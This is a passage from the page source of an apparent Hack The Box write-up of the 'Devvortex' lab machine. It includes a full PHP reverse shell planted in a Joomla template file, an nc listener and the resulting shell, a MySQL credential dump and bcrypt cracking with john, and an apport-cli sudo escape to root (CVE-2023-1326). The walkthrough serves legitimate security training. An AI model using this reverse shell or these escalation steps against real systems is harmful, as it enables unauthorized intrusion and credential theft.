</span></span><span style="display:flex;"><span>$error_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>$shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uname -a; w; id; sh -i&#39;</span>;
</span></span><span style="display:flex;"><span>$daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>$debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">function_exists</span>(<span style="color:#e6db74">&#39;pcntl_fork&#39;</span>)) {
</span></span><span style="display:flex;"><span>	$pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcntl_fork</span>();
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ($pid <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Can&#39;t fork&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ($pid) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">0</span>);  <span style="color:#75715e">// Parent exits
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">posix_setsid</span>() <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;Error: Can&#39;t setsid()&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chdir</span>(<span style="color:#e6db74">&#34;/&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">umask</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Open reverse connection
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>($ip, $port, $errno, $errstr, <span style="color:#ae81ff">30</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$sock) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$errstr</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">$errno</span><span style="color:#e6db74">)&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$descriptorspec <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>),  <span style="color:#75715e">// stdin is a pipe that the child will read from
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>),  <span style="color:#75715e">// stdout is a pipe that the child will write to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#ae81ff">2</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>)   <span style="color:#75715e">// stderr is a pipe that the child will write to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$process <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>($shell, $descriptorspec, $pipes);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_resource</span>($process)) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Can&#39;t spawn shell&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stream_set_blocking</span>($sock, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;Successfully opened reverse shell to </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">:</span><span style="color:#e6db74">$port</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">feof</span>($sock)) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Shell connection terminated&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">feof</span>($pipes[<span style="color:#ae81ff">1</span>])) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Shell process terminated&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$read_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>($sock, $pipes[<span style="color:#ae81ff">1</span>], $pipes[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>	$num_changed_sockets <span style="color:#f92672">=</span> <span style="color:#a6e22e">stream_select</span>($read_a, $write_a, $error_a, <span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($sock, $read_a)) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;SOCK READ&#34;</span>);
</span></span><span style="display:flex;"><span>		$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($sock, $chunk_size);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;SOCK: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fwrite</span>($pipes[<span style="color:#ae81ff">0</span>], $input);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($pipes[<span style="color:#ae81ff">1</span>], $read_a)) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDOUT READ&#34;</span>);
</span></span><span style="display:flex;"><span>		$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($pipes[<span style="color:#ae81ff">1</span>], $chunk_size);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDOUT: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fwrite</span>($sock, $input);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($pipes[<span style="color:#ae81ff">2</span>], $read_a)) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDERR READ&#34;</span>);
</span></span><span style="display:flex;"><span>		$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($pipes[<span style="color:#ae81ff">2</span>], $chunk_size);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDERR: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fwrite</span>($sock, $input);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($sock);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">proc_close</span>($process);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">printit</span> ($string) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$daemon) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$string\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>I open a Listening Port:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">9001</span>  
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
</span></span></code></pre></div><p>I execute the php file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ curl http://dev.devvortex.htb/administrator/templates/atum/error.php
</span></span></code></pre></div><p>Spawn the Reverse Shell:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">9001</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.95<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.242<span style="color:#f92672">]</span> <span style="color:#ae81ff">34608</span>
</span></span><span style="display:flex;"><span>Linux devvortex 5.4.0-167-generic <span style="color:#75715e">#184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span style="display:flex;"><span> 20:17:06 up  1:38,  <span style="color:#ae81ff">3</span> users,  load average: 0.08, 0.22, 0.53
</span></span><span style="display:flex;"><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span style="display:flex;"><span>logan    pts/1    10.10.14.205     19:46   30:58   0.03s  0.03s -bash
</span></span><span style="display:flex;"><span>logan    pts/2    10.10.14.205     19:55   19:44   0.04s  0.04s -bash
</span></span><span style="display:flex;"><span>logan    pts/3    10.10.14.205     20:09    5:33   1.88s  0.04s sshd: logan <span style="color:#f92672">[</span>priv<span style="color:#f92672">]</span>  
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>sh: 0: can<span style="color:#e6db74">&#39;t access tty; job control turned off
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$ python3 -c &#39;</span>import pty; pty.spawn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span><span style="color:#f92672">)</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>www-data@devvortex:/$ 
</span></span></code></pre></div><h2 id="lateral-movement">Lateral Movement<a href="#lateral-movement" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>The main vulnerability exploit a <code>Disclosure Information</code> on MySQL, thereby I try to connect to MySQL (in localhost):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>www-data@devvortex:/$ mysql -u lewis -h 127.0.0.1 -P <span style="color:#ae81ff">3306</span> -p
</span></span><span style="display:flex;"><span>mysql -u lewis -h 127.0.0.1 -P <span style="color:#ae81ff">3306</span> -p
</span></span><span style="display:flex;"><span>Enter password: P4ntherg0t1n5r3c0n##
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Welcome to the MySQL monitor.  Commands end with ; or <span style="color:#ae81ff">\g</span>.
</span></span><span style="display:flex;"><span>Your MySQL connection id is <span style="color:#ae81ff">9837</span>
</span></span><span style="display:flex;"><span>Server version: 8.0.35-0ubuntu0.20.04.1 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>                                                                    
</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2000, 2023, Oracle and/or its affiliates.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Oracle is a registered trademark of Oracle Corporation and/or its
</span></span><span style="display:flex;"><span>affiliates. Other names may be trademarks of their respective
</span></span><span style="display:flex;"><span>owners.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#39;help;&#39;</span> or <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> to clear the current input statement.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mysql&gt; Show databases; 
</span></span><span style="display:flex;"><span>Show databases;
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span>| Database           |
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span>| information_schema |
</span></span><span style="display:flex;"><span>| joomla             |
</span></span><span style="display:flex;"><span>| performance_schema |
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> rows in set <span style="color:#f92672">(</span>0.00 sec<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mysql&gt; use joomla;
</span></span><span style="display:flex;"><span>use joomla;
</span></span><span style="display:flex;"><span>Reading table information <span style="color:#66d9ef">for</span> completion of table and column names
</span></span><span style="display:flex;"><span>You can turn off this feature to get a quicker startup with -A
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Database changed
</span></span><span style="display:flex;"><span>mysql&gt; <span style="color:#66d9ef">select</span> * from sd4fg_users;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> * from sd4fg_users;
</span></span><span style="display:flex;"><span>+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
</span></span><span style="display:flex;"><span>| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
</span></span><span style="display:flex;"><span>+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">649</span> | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     <span style="color:#ae81ff">0</span> |         <span style="color:#ae81ff">1</span> | 2023-09-25 16:44:24 | 2023-12-12 20:02:14 | <span style="color:#ae81ff">0</span>          |                                                                                                                                                         | NULL          |          <span style="color:#ae81ff">0</span> |        |      |            <span style="color:#ae81ff">0</span> |              |
</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">650</span> | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     <span style="color:#ae81ff">0</span> |         <span style="color:#ae81ff">0</span> | 2023-09-26 19:15:42 | NULL                |            | <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;admin_style&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;admin_language&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;language&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;editor&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;timezone&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;a11y_mono&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;a11y_contrast&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;a11y_highlight&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;a11y_font&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">}</span> | NULL          |          <span style="color:#ae81ff">0</span> |        |      |            <span style="color:#ae81ff">0</span> |              |
</span></span><span style="display:flex;"><span>+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> rows in set <span style="color:#f92672">(</span>0.01 sec<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>I have discover the hash of logan :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj1
</span></span></code></pre></div><p>I crack it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/devvortex<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nano hash.txt                                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/devvortex<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ john hash.txt -wordlist:/usr/share/wordlists/rockyou.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>bcrypt <span style="color:#f92672">[</span>Blowfish 32/64 X3<span style="color:#f92672">])</span>
</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">1024</span> <span style="color:#66d9ef">for</span> all loaded hashes
</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">2</span> OpenMP threads
</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
</span></span><span style="display:flex;"><span>tequieromucho    <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
</span></span><span style="display:flex;"><span>1g 0:00:00:17 DONE <span style="color:#f92672">(</span>2023-12-12 15:42<span style="color:#f92672">)</span> 0.05861g/s 82.29p/s 82.29c/s 82.29C/s kelvin..harry
</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span>Session completed. 
</span></span></code></pre></div><p>I take the <code>user flag</code>:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~/devvortex]
└─$ ssh logan@devvortex.htb                            
logan@devvortex.htb&#39;s password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 12 Dec 2023 08:44:17 PM UTC

  System load:           0.09
  Usage of /:            64.9% of 4.76GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             175
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.242
  IPv6 address for eth0: dead:beef::250:56ff:feb9:abd1

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Dec 12 20:09:38 2023 from 10.10.14.205
logan@devvortex:~$ cat user.txt
cc61a786ad2e1f6bfe484d7534015b30
</code></pre><h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>I see all the <code>sudo privileges</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>logan@devvortex:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> logan on devvortex:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User logan may run the following commands on devvortex:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> /usr/bin/apport-cli
</span></span></code></pre></div><p>To exploit this  <code>/usr/bin/apport-cli</code> follow this steps (to other information <code>https://github.com/diego-tella/CVE-2023-1326-PoC</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>1<span style="color:#f92672">)</span> sudo /usr/bin/apport-cli -c /var/crash/some_crash_file.crash
</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> press V <span style="color:#f92672">(</span>view report<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>3<span style="color:#f92672">)</span> !/bin/bash
</span></span></code></pre></div><p>I take the <code>root flag</code>:</p>
<pre tabindex="0"><code>root@devvortex:/home/logan# cat /root/root.txt
6feb51f6e95f9982fadf5a3d82d33582
</code></pre>
      </div></div>

  
    
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        
        <span class="button next">
            <a href="/posts/codify/">
                <span class="button__text">HTB Writeup - Codify (Easy)</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
    
        <span>::  </span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
